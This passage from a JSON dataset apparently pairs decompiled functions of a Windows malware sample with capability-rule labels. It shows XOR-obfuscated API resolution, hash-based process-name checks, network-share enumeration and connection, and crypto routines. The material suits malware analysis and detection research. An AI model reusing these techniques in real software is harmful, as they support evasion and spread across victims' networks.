uStack37;\n    uchar uStack36;\n    uchar uStack35;\n    uchar uStack34;\n    uchar uStack33;\n    uchar uStack32;\n    uchar uStack31;\n    uchar uStack30;\n    uchar uStack29;\n    uchar uStack28;\n    uchar uStack27;\n    uchar uStack26;\n    uchar uStack25;\n    uchar uStack24;\n    uchar uStack23;\n    uchar uStack22;\n    uchar uStack21;\n    code *var_10h;\n    uchar var_ch;\n    uchar var_bh;\n    uchar var_ah;\n    int32_t var_8h;\n    uchar uStack6;\n    uchar uStack5;\n    \n    if (*0x428418 == 0) {\n        var_ah = 0;\n        var_bh = 0x6c;\n        iStack432 = &fcn.00417880::var_10h + 1;\n        var_10h = 0x64746e68;\n        var_ch = 0x6c;\n        iStack436 = 0x4178d2;\n        *0x428418 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)();\n    }\n    iVar9 = *0x428418;\n    var_fah_2 = *0x423f40;\n    uStack250 = *0x423f44;\n    uStack246 = *0x423f48;\n    uStack242 = *0x423f4c;\n    var_eah_2 = 0x41465d5b;\n    var_e6h_2 = 0x48;\n    iStack432 = 0x417906;\n    iStack432 = fcn.00401e40();\n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    iStack440 = 0x417910;\n    iStack436 = iVar9;\n    piVar7 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n    var_dbh_2 = *0x423d50;\n    uStack219 = *0x423d54;\n    uStack215 = *0x423d58;\n    uStack211 = *0x423d5c;\n    uVar12 = 0;\n    var_44h_2 = piVar7;\n    var_cbh_2 = *0x423f30;\n    uStack203 = *0x423f34;\n    uStack199 = *0x423f38;\n    uStack195 = *0x423f3c;\n    var_bbh_2 = 0x61467d61;\n    var_b7h_2 = 0x66606174;\n    var_b3h_2 = 0;\n    do {\n        var_dbh_2._0_1_ = *0x423d50;\n        puVar1 = &fcn.00417880::var_dbh_2 + uVar12 + 1;\n        *puVar1 = *puVar1 ^ var_dbh_2;\n        uVar12 = uVar12 + 1;\n    } while (uVar12 < 0x27);\n    iStack440 = &fcn.00417880::var_dbh_2 + 1;\n    var_b3h_2 = 0;\n    iStack444 = *0x428418;\n    uStack448 = 0x417979;\n    pcVar8 = (*pcVar5)();\n    if ((piVar7 == NULL) || (pcVar8 == NULL)) {\n        return 0x65a;\n    }\n    uStack448 = 0;\n    uStack452 = 0;\n    puStack456 = &fcn.00417880::var_e4h_2;\n    puStack464 = 0x417997;\n    iVar9 = (*pcVar8)();\n    if (-1 < iVar9) {\n        puStack396 = &fcn.00417880::var_e4h_2;\n        uStack32 = 0x33;\n        uStack30 = 0x74;\n        uStack31 = 0x4e;\n        uStack5 = 0x5f;\n        uStack23 = 0x6c;\n        uStack6 = 0x56;\n        uStack27 = 0x65;\n        uStack22 = 0x65;\n        uStack29 = 0x4f;\n        puStack464 = &stack0xffffffe1;\n        iStack468 = *0x428418;\n        uStack28 = 0x70;\n        uStack404 = 0x18;\n        uStack26 = 0x6e;\n        uStack400 = 0;\n        uStack25 = 0x46;\n        uStack392 = 0;\n        uStack24 = 0x69;\n        uStack384 = 0;\n        uStack21 = 0;\n        puStack472 = 0x417a42;\n        pcVar8 = (*pcVar5)();\n        pcVar5 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        uStack41 = 0x79;\n        uStack33 = 0;\n        uStack34 = 0x65;\n        uStack40 = 0x4e;\n        uStack39 = 0x74;\n        uStack38 = 0x43;\n        uStack37 = 0x6c;\n        uStack36 = 0x6f;\n        puStack472 = &stack0xffffffd8;\n        uStack35 = 0x73;\n        iStack476 = *0x428418;\n        puStack480 = 0x417a94;\n        *NULL = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n        if ((pcVar8 == NULL) || (*NULL == NULL)) {\n            iVar9 = 0x65a;\n        }\n        else {\n            puStack480 = NULL;\n            iStack484 = 7;\n            iVar9 = (*pcVar8)(&fcn.00417880::var_40h_2, 0x80, &stack0xfffffe6c, &stack0xfffffe64);\n            if (-1 < iVar9) {\n                uVar12 = 0;\n                var_84h_2 = var_40h_2;\n                uStack126 = *0x423ee0;\n                uStack122 = *0x423ee4;\n                uStack118 = *0x423ee8;\n                uStack114 = *0x423eec;\n                uStack110 = 0x4169686e;\n                uStack106 = 0x626b6e;\n                do {\n                    uStack126._0_1_ = *0x423ee0;\n                    (&stack0xffffff83)[uVar12] = (&stack0xffffff83)[uVar12] ^ uStack126;\n                    uVar12 = uVar12 + 1;\n                } while (uVar12 < 0x16);\n                puStack480 = &stack0xffffff83;\n                uStack106 = uStack106 & 0xffffff;\n                iStack484 = *0x428418;\n                var_80h_2 = &stack0xfffffe1c;\n                var_88h_2 = (*pcVar5)();\n                if (var_88h_2 == NULL) {\n                    (*stack0xffffff64)(var_40h_2);\n                    (*var_44h_2)(&fcn.00417880::var_e4h_2);\n                    return 0x65a;\n                }\n                var_34h_2 = 0;\n                fcn.00407e2d();\n                var_8h = 0;\n                uVar12 = 0;\n                uVar14 = 0x104;\n                piVar7 = var_44h_2;\n                do {\n                    if (uVar12 < uVar14) {\n                        fcn.00407e2d();\n                        uVar12 = var_80h_2 - &stack0xfffffe1c;\n                        piVar7 = &stack0xfffffe1c;\n                        var_34h_2 = uVar12;\n                    }\n                    iVar9 = (*var_88h_2)(var_84h_2, &fcn.00417880::var_178h, piVar7, uVar12, 0x2f);\n                    var_30h = iVar9;\n                    if ((-1 < iVar9) && (*piVar7 != 0)) {\n                        var_b2h = *0x423b60;\n                        uStack178 = *0x423b64;\n                        uStack174 = *0x423b68;\n                        uStack170 = *0x423b6c;\n                        var_a2h = 0x41b060f;\n                        var_9eh = 0x6001d08;\n                        var_9ah._0_2_ = 7;\n                        uVar10 = fcn.00402150();\n                        var_10h = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x428418, uVar10);\n                        var_2ch = 0x8000;\n                        if (var_10h != NULL) {\n                            var_170h = 0x2c99bb9e;\n                            var_16ch = 0x280283ec;\n                            var_168h = 0xb1dfe25e;\n                            var_164h = 0xf0952b3f;\n                            var_160h = 0xe3040ac3;\n                            var_15ch = 0xdff94c0e;\n                            var_158h = 0x230d4c0f;\n                            var_154h = 0xedffa2df;\n                            var_150h = 0x7679dad9;\n                            var_14ch = 0xdfd4e1b0;\n                            var_148h = 0x2c03bac0;\n                            var_144h = 0xb2e7021a;\n                            var_140h = 0xa2db72b9;\n                            var_13ch = 0x2bc94c0f;\n                            var_138h = 0x6c916b9f;\n                            var_134h = 0x5fc881ab;\n                            var_130h = 0x6318437e;\n                            var_12ch = 0x32fb431e;\n                            var_128h = 0xeef7fba3;\n                            var_124h = 0x3ce08834;\n                            var_120h = 0x4a00e40d;\n                            var_11ch = 0x86059875;\n                            var_118h = 0x728cb221;\n                            var_114h = 0x5e2d07a0;\n                            var_110h = 0x2903f2af;\n                            var_10ch = 0x33fb126d;\n                            var_108h = 0x6895e8e4;\n                            var_104h = 0x39db8e34;\n                            do {\n                                pcVar5 = var_10h;\n                                piVar11 = (*_sym.imp.msvcrt.dll_malloc)(var_2ch);\n                                iVar9 = var_30h;\n                                var_90h = piVar11;\n                                if (piVar11 == NULL) goto code_r0x00417ea9;\n                                var_94h = (*pcVar5)(5, piVar11, var_2ch, &fcn.00417880::var_2ch);\n                                piVar13 = piVar11;\n                                if (-1 < var_94h) {\n                                    iVar9 = 0;\n                                    do {\n                                        var_8ch = piVar7 + 1;\n                                        var_3ch = *piVar7;\n                                        piVar11 = piVar11 + iVar9;\n                                        do {\n                                            iVar9 = *var_8ch;\n                                            var_8ch = var_8ch + 1;\n                                            if (iVar9 == piVar11[0x11]) {\n                                                piVar3 = piVar11[0xf];\n                                                iVar9 = 0;\n                                                if (piVar3 != NULL) {\n                                                    iVar2 = *piVar3;\n                                                    piVar4 = piVar3;\n                                                    while (iVar2 != 0) {\n                                                        piVar4 = piVar4 + 1;\n                                                        iVar9 = iVar9 + 1;\n                                                        iVar2 = *piVar4;\n                                                    }\n                                                }\n                                                (*_sym.imp.USER32.dll_CharLowerBuffW)(piVar3, iVar9);\n                                                var_38h = 0;\n                                                iVar2 = *piVar11[0xf];\n                                                while( true ) {\n                                                    if (iVar2 == 0) {\n                                                        iVar9 = 0;\n                                                    }\n                                                    else {\n                                                        iVar9 = fcn.004041e0();\n                                                    }\n                                                    if (iVar9 == (&fcn.00417880::var_170h)[var_38h]) break;\n                                                    var_38h = var_38h + 1;\n                                                    if (0x1b < var_38h) {\n                                                        uVar12 = 0;\n                                                        var_62h = *0x423e20;\n                                                        uStack98 = *0x423e24;\n                                                        uStack94 = *0x423e28;\n                                                        uStack90 = *0x423e2c;\n                                                        var_52h = 0x275c2f59;\n                                                        var_4eh = 0x4618150c;\n                                                        var_4ah = 0x1810595c;\n                                                        var_46h = 0x21;\n                                                        do {\n                                                            var_62h._0_1_ = *0x423e20;\n                                                            puVar1 = &fcn.00417880::var_62h + uVar12 + 1;\n                                                            *puVar1 = *puVar1 ^ var_62h;\n                                                            uVar12 = uVar12 + 1;\n                                                        } while (uVar12 < 0x1c);\n                                                        var_46h = var_46h & 0xff;\n                                                        fcn.0040f630(&fcn.00417880::var_62h + 1, piVar11[0xf]);\n                                                        fcn.00416710();\n                                                        var_8h = var_8h + 1;\n                                                        iVar9 = var_30h;\n                                                        goto code_r0x00417ea9;\n                                                    }\n                                                }\n                                            }\n                                            var_3ch = var_3ch + -1;\n                                        } while (var_3ch != 0);\n                                        iVar9 = *piVar11;\n                                        piVar13 = var_90h;\n                                    } while (iVar9 != 0);\n                                }\n                                iVar6 = var_94h;\n                                (*_sym.imp.msvcrt.dll_free)(piVar13);\n                            } while (iVar6 == -0x3ffffffc);\n                            iVar9 = var_30h;\n                            if (iVar6 == 1) {\n                                var_8h = var_8h + 1;\n                            }\n                        }\n                    }\ncode_r0x00417ea9:\n                    uVar12 = var_34h_2;\n                    uVar14 = var_174h;\n                    if (iVar9 != -0x3ffffffc) {\n                        if (0 < var_8h) {\n                            iVar9 = 1;\n                        }\n                        (*stack0xffffff64)(var_40h_2);\n                        (*var_44h_2)(&fcn.00417880::var_e4h_2);\n                        return iVar9;\n                    }\n                } while( true );\n            }\n        }\n        puStack480 = &fcn.00417880::var_e4h_2;\n        iStack484 = 0x417ef6;\n        (*var_44h_2)();\n    }\n    return iVar9;\n}\n",
        "token_count": 4552
    },
    "00419d30": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00419d30(uint param_1)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    code *pcVar4;\n    uint32_t uVar5;\n    code *pcVar6;\n    uint *puVar7;\n    int32_t iVar8;\n    uint var_7c8h;\n    uint var_3b8h;\n    uint ARG_0;\n    uint var_170h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_60h;\n    uint *var_5ch;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint *var_48h;\n    uint32_t var_44h;\n    int32_t var_40h;\n    uint var_3ah;\n    uint var_2eh;\n    uchar var_2ah;\n    uchar uStack45;\n    uchar var_28h;\n    uint var_27h;\n    uint var_23h;\n    uint var_1fh;\n    uint var_1bh;\n    uint var_15h;\n    uint var_10h;\n    ushort var_ch;\n    uchar var_9h;\n    uint var_8h;\n    uchar var_4h [3];\n    uint var_1h;\n    \n    var_40h = 0;\n    fcn.004124f0(&var_170h, 0, 0x100);\n    iVar8 = 0;\n    puVar7 = &var_170h;\n    while (var_170h != 0) {\n        puVar7 = puVar7 + 2;\n        iVar8 = iVar8 + 1;\n        var_170h._0_2_ = *puVar7;\n    }\n    fcn.004124d0(&var_170h, param_1, iVar8 * 2 + 2);\n    _var_4h = 0x532533;\n    (*_sym.imp.USER32.dll_wsprintfA)(&ARG_0, var_4h + 1, param_1);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetModuleHandleA;\n    stack0xffffffe4 = CONCAT13(7, stack0xffffffe4);\n    var_8h._0_1_ = 0x79;\n    var_9h = 0x75;\n    var_8h._1_1_ = 0x57;\n    var_8h._3_1_ = 0x32;\n    var_8h._2_1_ = 0x53;\n    _var_4h = 0x32335f;\n    var_10h._2_2_ = 0x6464;\n    stack0xffffffe8 = 0x74656e69;\n    var_ch = 0x72;\n    var_10h._0_2_ = 0x615f;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(&var_8h + 1, &var_15h + 1);\n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n    var_27h._0_1_ = 0x2f;\n    var_27h._1_1_ = 0x48;\n    var_27h._2_1_ = 0x4a;\n    var_27h._3_1_ = 0x5b;\n    var_23h._0_1_ = 0x47;\n    var_23h._1_1_ = 0x40;\n    var_23h._2_1_ = 0x5c;\n    var_23h._3_1_ = 0x5b;\n    var_1fh._0_1_ = 0x4d;\n    var_1fh._1_1_ = 0x56;\n    var_1fh._2_1_ = 0x4e;\n    var_1fh._3_1_ = 0x4b;\n    uVar5 = 0;\n    var_1bh._0_1_ = 0x4b;\n    var_1bh._1_1_ = 0x5d;\n    var_1bh._2_1_ = 0;\n    do {\n        puVar1 = &var_27h + uVar5 + 1;\n        *puVar1 = *puVar1 ^ 0x2f;\n        uVar5 = uVar5 + 1;\n    } while (uVar5 < 0xd);\n    var_1bh._2_1_ = 0;\n    uVar3 = (*pcVar2)(&var_8h + 1, &var_27h + 1);\n    pcVar6 = (*pcVar6)(uVar3);\n    if ((((pcVar4 != NULL) && (pcVar6 != NULL)) && (var_40h = (*pcVar4)(&ARG_0),  var_40h != -1)) &&\n       (puVar7 = (*pcVar6)(&var_40h, 4, 2),  puVar7 != NULL)) {\n        fcn.004124f0(&var_170h, 0, 0x100);\n        var_10h._0_2_ = *0x4238a6 ^ 0x15;\n        stack0xffffffe4 = 0x300015;\n        var_10h._2_2_ = str._S._0_4_ ^ 0x15;\n        stack0xffffffe8 = 0x150046;\n        var_ch = 0;\n        uVar3 = fcn.00401320(*puVar7);\n        (*_sym.imp.USER32.dll_wsprintfW)(&var_170h, uVar3);\n    }\n    pcVar6 = _sym.imp.NETAPI32.dll_NetApiBufferFree;\n    _var_4h = 0;\n    do {\n        var_23h._1_1_ = *0x4238b2;\n        var_23h._3_1_ = str._s_s._0_4_;\n        var_1fh._1_1_ = str._s_s._0_4_ >> 0x10;\n        var_1fh._3_1_ = str._s_s._4_4_;\n        var_44h = 0;\n        var_50h = 0;\n        var_2eh = 0x5c003c;\n        var_2ah = 0x5c;\n        var_4ch = 0;\n        uStack45 = 0;\n        var_28h = 0x25;\n        var_27h._0_1_ = 0;\n        var_27h._1_1_ = 0x53;\n        var_27h._2_1_ = 0;\n        var_27h._3_1_ = 0;\n        var_23h._0_1_ = 0;\n        var_23h._2_1_ = var_23h._1_1_ >> 7;\n        var_1fh._0_1_ = var_23h._3_1_ >> 7;\n        var_1fh._2_1_ = var_1fh._1_1_ >> 7;\n        var_1bh._0_1_ = var_1fh._3_1_ >> 7;\n        var_1bh._1_1_ = 0;\n        var_1bh._2_1_ = 0;\n        (*_sym.imp.USER32.dll_wsprintfW)(&var_3b8h, &var_2eh + 2, &var_170h);\n        var_6ch = 0;\n        var_5ch = &var_3b8h;\n        var_60h = 0;\n        var_54h = 0;\n        (*_sym.imp.MPR.dll_WNetAddConnection2W)(&var_70h, 0, 0, 0);\n        do {\n            iVar8 = (*_sym.imp.NETAPI32.dll_NetShareEnum)\n                              (&var_170h, 1, &var_48h, 0xffffffff, &var_44h, &var_50h, &var_4ch);\n            if ((iVar8 != 0) && (iVar8 != 0xea)) break;\n            uVar5 = 1;\n            puVar7 = var_48h;\n            if (var_44h != 0) {\n                do {\n                    if (puVar7[1] == 0) {\n                        fcn.00406bb0(puVar7, var_48h, &var_170h, *puVar7);\n                        uVar3 = fcn.00401ce0();\n                        (*_sym.imp.USER32.dll_wsprintfW)(&var_7c8h, uVar3);\n                        fcn.00410170(&var_7c8h);\n                        pcVar6 = swi(3);\n                        uVar3 = (*pcVar6)();\n                        return uVar3;\n                    }\n                    uVar5 = uVar5 + 1;\n                    puVar7 = puVar7 + 3;\n                } while (uVar5 <= var_44h);\n            }\n            (*pcVar6)(var_48h);\n        } while (iVar8 == 0xea);\n        if (iVar8 != 5) {\n            return 1;\n        }\n        if (_var_4h != 0) {\n            return 1;\n        }\n        _var_4h = 1;\n        iVar8 = fcn.00417790();\n        if (iVar8 == 0) {\n            return 1;\n        }\n    } while( true );\n}\n",
        "token_count": 2202
    },
    "004080b0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004080b0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    code **ppcVar2;\n    int32_t arg_ch;\n    uint var_88h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (*(arg_8h + 0x70) == 0) {\n        return -0x40;\n    }\n    arg_ch = 0;\n    if (0 < *(arg_8h + 0x70)) {\n        ppcVar2 = arg_8h + 0x74;\n        var_8h = 0;\n        do {\n            var_4h = 0;\n            if (ppcVar2[4] == 0x1) {\n                var_8h = 1;\n            }\n            iVar1 = (**ppcVar2)(ppcVar2[1], &var_88h, 0x80, &var_4h);\n            if (iVar1 != 0) goto code_r0x00408150;\n            if (var_4h != 0) {\n                iVar1 = fcn.00408170(arg_8h, arg_ch, &var_88h, var_4h);\n                if (iVar1 != 0) {\n                    return iVar1;\n                }\n                ppcVar2[2] = ppcVar2[2] + var_4h;\n            }\n            arg_ch = arg_ch + 1;\n            ppcVar2 = ppcVar2 + 5;\n        } while (arg_ch < *(arg_8h + 0x70));\n        if (var_8h != 0) goto code_r0x00408150;\n    }\n    iVar1 = -0x3d;\ncode_r0x00408150:\n    fcn.0040eda0(&var_88h, 0x80);\n    return iVar1;\n}\n",
        "token_count": 427
    },
    "00408170": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00408170(int32_t *arg_8h, uint arg_ch, uint *arg_10h, uint32_t arg_14h)\n\n{\n    int32_t *arg_8h_00;\n    int32_t iVar1;\n    uint32_t arg_10h_00;\n    uint var_20h;\n    \n    arg_10h_00 = arg_14h;\n    if (0x20 < arg_14h) {\n        iVar1 = fcn.0040eb80(arg_10h, arg_14h, &var_20h, 0);\n        if (iVar1 != 0) goto code_r0x004081fa;\n        arg_10h = &var_20h;\n        arg_10h_00 = 0x20;\n    }\n    arg_14h = arg_14h & 0xffff0000 | CONCAT11(arg_10h_00, arg_ch);\n    arg_8h_00 = arg_8h + 1;\n    if ((*arg_8h != 0) || (iVar1 = fcn.0040ebf0(arg_8h_00, 0),  iVar1 == 0)) {\n        *arg_8h = 1;\n        iVar1 = fcn.0040ecc0(arg_8h_00, &arg_14h, 2);\n        if (iVar1 == 0) {\n            iVar1 = fcn.0040ecc0(arg_8h_00, arg_10h, arg_10h_00);\n        }\n    }\ncode_r0x004081fa:\n    fcn.0040eda0(&var_20h, 0x20);\n    return iVar1;\n}\n",
        "token_count": 381
    },
    "00408710": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00408710(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    char *pcVar2;\n    uint32_t arg_10h_00;\n    uint var_40h;\n    uint var_10h;\n    \n    if (0x400 < arg_10h) {\n        return -0x36;\n    }\n    fcn.004124f0(&var_40h, 0, 0x30);\n    if (((*(arg_8h + 0x1c) < *(arg_8h + 0x10)) || (*(arg_8h + 0x14) != 0)) &&\n       (iVar1 = fcn.00408800(arg_8h, 0, 0),  iVar1 != 0)) {\n        return iVar1;\n    }\n    if (arg_10h != 0) {\n        pcVar2 = arg_8h + 0xf;\n        arg_10h_00 = arg_10h;\ncode_r0x00408775:\n        do {\n            *pcVar2 = *pcVar2 + '\\x01';\n            if (*pcVar2 == '\\0') {\n                pcVar2 = pcVar2 + -1;\n                if (0 < pcVar2 + (1 - arg_8h)) goto code_r0x00408775;\n            }\n            iVar1 = fcn.00408a30(arg_8h + 0x20, 1, arg_8h, &var_10h);\n            if (iVar1 != 0) goto code_r0x004087d7;\n            if (0x10 < arg_10h) {\n                arg_10h_00 = 0x10;\n            }\n            fcn.004124d0(arg_ch, &var_10h, arg_10h_00);\n            arg_ch = arg_ch + arg_10h_00;\n            pcVar2 = arg_8h + 0xf;\n            arg_10h_00 = arg_10h - arg_10h_00;\n            arg_10h = arg_10h_00;\n        } while (arg_10h_00 != 0);\n    }\n    iVar1 = fcn.004085f0(arg_8h, &var_40h);\n    if (iVar1 == 0) {\n        *(arg_8h + 0x10) = *(arg_8h + 0x10) + 1;\n    }\ncode_r0x004087d7:\n    fcn.0040eda0(&var_40h, 0x30);\n    fcn.0040eda0(&var_10h, 0x10);\n    return 0;\n}\n",
        "token_count": 614
    },
    "00408960": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00408960(uint arg_8h, int32_t arg_ch, int32_t arg_10h, uchar (*arg_14h) [16], uchar (*arg_18h) [16], \n            uchar (*arg_1ch) [16])\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uchar *puVar4;\n    uchar (*pauVar5) [16];\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t var_4h;\n    \n    if (arg_10h != 0) {\n        iVar7 = arg_14h - arg_18h;\n        var_4h = (arg_10h - 1U >> 4) + 1;\n        do {\n            if (((*arg_18h + 0xf < arg_1ch) || (*arg_1ch + 0xf < arg_18h)) &&\n               ((*arg_14h + 0xf < arg_1ch || (*arg_1ch + 0xf < arg_14h)))) {\n                *arg_1ch = *arg_18h ^ *arg_14h;\n            }\n            else {\n                iVar6 = 0x10;\n                pauVar5 = arg_18h;\n                do {\n                    (arg_1ch + (-1 - arg_18h))[*pauVar5 + 1] = (*pauVar5)[iVar7] ^ (*pauVar5)[0];\n                    iVar6 = iVar6 + -1;\n                    pauVar5 = *pauVar5 + 1;\n                } while (iVar6 != 0);\n            }\n            if (arg_ch == 1) {\n                fcn.00409530(arg_8h, arg_1ch, arg_1ch);\n            }\n            else {\n                fcn.00408fa0(arg_8h, arg_1ch, arg_1ch);\n            }\n            puVar4 = *arg_1ch;\n            uVar1 = *(*arg_1ch + 4);\n            uVar2 = *(*arg_1ch + 8);\n            uVar3 = *(*arg_1ch + 0xc);\n            arg_1ch = arg_1ch[1];\n            iVar7 = iVar7 + -0x10;\n            arg_18h = arg_18h[1];\n            var_4h = var_4h + -1;\n            **arg_14h = *puVar4;\n            *(*arg_14h + 4) = uVar1;\n            *(*arg_14h + 8) = uVar2;\n            *(*arg_14h + 0xc) = uVar3;\n        } while (var_4h != 0);\n    }\n    return 0;\n}\n",
        "token_count": 613
    },
    "00408a30": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408a30(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    if (arg_ch == 1) {\n        fcn.00409530(arg_8h, arg_10h, arg_14h);\n        return;\n    }\n    fcn.00408fa0(arg_8h, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 100
    },
    "00409ac0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00409ac0(uint *arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint *arg_ch_00;\n    uint *puVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    uint *puVar6;\n    uint32_t *puVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t *puVar10;\n    uint32_t uVar11;\n    bool bVar12;\n    \n    puVar3 = arg_8h;\n    puVar6 = arg_ch;\n    arg_ch_00 = arg_8h;\n    if (arg_8h != arg_10h) {\n        puVar6 = arg_10h;\n        arg_ch_00 = arg_ch;\n    }\n    if ((arg_8h == arg_ch_00) || (iVar4 = fcn.00409f60(arg_8h, arg_ch_00),  iVar4 == 0)) {\n        *arg_8h = 1;\n        uVar9 = puVar6[1];\n        if (uVar9 != 0) {\n            piVar5 = puVar6[2] + uVar9 * 4;\n            do {\n                piVar5 = piVar5 + -1;\n                if (*piVar5 != 0) break;\n                uVar9 = uVar9 - 1;\n            } while (uVar9 != 0);\n        }\n        if (10000 < uVar9) {\n            return -0x10;\n        }\n        if (arg_8h[1] < uVar9) {\n            iVar4 = sub.msvcrt.dll_calloc(uVar9, 4);\n            if (iVar4 == 0) {\n                return -0x10;\n            }\n            if (arg_8h[2] != 0) {\n                fcn.004124d0(iVar4, arg_8h[2], arg_8h[1] << 2);\n                fcn.0040eda0(arg_8h[2], arg_8h[1] << 2);\n                sub.msvcrt.dll_free(arg_8h[2]);\n            }\n            arg_8h[1] = uVar9;\n            arg_8h[2] = iVar4;\n        }\n        puVar10 = puVar6[2];\n        puVar7 = arg_8h[2];\n        if (uVar9 != 0) {\n            uVar8 = 0;\n            arg_ch = uVar9;\n            do {\n                uVar1 = *puVar10;\n                puVar10 = puVar10 + 1;\n                uVar2 = *puVar7;\n                uVar11 = uVar2 + uVar8 + uVar1;\n                *puVar7 = uVar11;\n                puVar7 = puVar7 + 1;\n                arg_ch = arg_ch - 1;\n                uVar8 = (uVar2 + uVar8 < uVar8) + (uVar11 < uVar1);\n            } while (arg_ch != NULL);\n            if (uVar8 != 0) {\n                arg_8h = uVar9 * 4;\n                do {\n                    uVar11 = uVar9 + 1;\n                    if (puVar3[1] <= uVar9) {\n                        if (10000 < uVar11) {\n                            return -0x10;\n                        }\n                        if (puVar3[1] < uVar11) {\n                            iVar4 = sub.msvcrt.dll_calloc(uVar11, 4);\n                            if (iVar4 == 0) {\n                                return -0x10;\n                            }\n                            if (puVar3[2] != 0) {\n                                fcn.004124d0(iVar4, puVar3[2], puVar3[1] << 2);\n                                fcn.0040eda0(puVar3[2], puVar3[1] << 2);\n                                sub.msvcrt.dll_free(puVar3[2]);\n                            }\n                            puVar3[1] = uVar11;\n                            puVar3[2] = iVar4;\n                        }\n                        puVar7 = puVar3[2] + arg_8h;\n                    }\n                    uVar9 = *puVar7 + uVar8;\n                    *puVar7 = uVar9;\n                    arg_8h = arg_8h + 4;\n                    puVar7 = puVar7 + 1;\n                    bVar12 = uVar9 < uVar8;\n                    uVar8 = uVar9 < uVar8;\n                    uVar9 = uVar11;\n                } while (bVar12);\n            }\n        }\n        iVar4 = 0;\n    }\n    return iVar4;\n}\n",
        "token_count": 1069
    },
    "00409d40": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00409d40(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    if (*(arg_8h + 4) == 0) {\n        return 0;\n    }\n    iVar2 = *(arg_8h + 4) + -1;\n    if (iVar2 != 0) {\n        piVar1 = *(arg_8h + 8) + iVar2 * 4;\n        do {\n            if (*piVar1 != 0) break;\n            piVar1 = piVar1 + -1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    uVar3 = 0;\n    uVar4 = 0x80000000;\n    do {\n        if ((uVar4 & *(*(arg_8h + 8) + iVar2 * 4)) != 0) break;\n        uVar3 = uVar3 + 1;\n        uVar4 = uVar4 >> 1;\n    } while (uVar3 < 0x20);\n    return (iVar2 + 1) * 0x20 - uVar3;\n}\n",
        "token_count": 285
    },
    "00409da0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
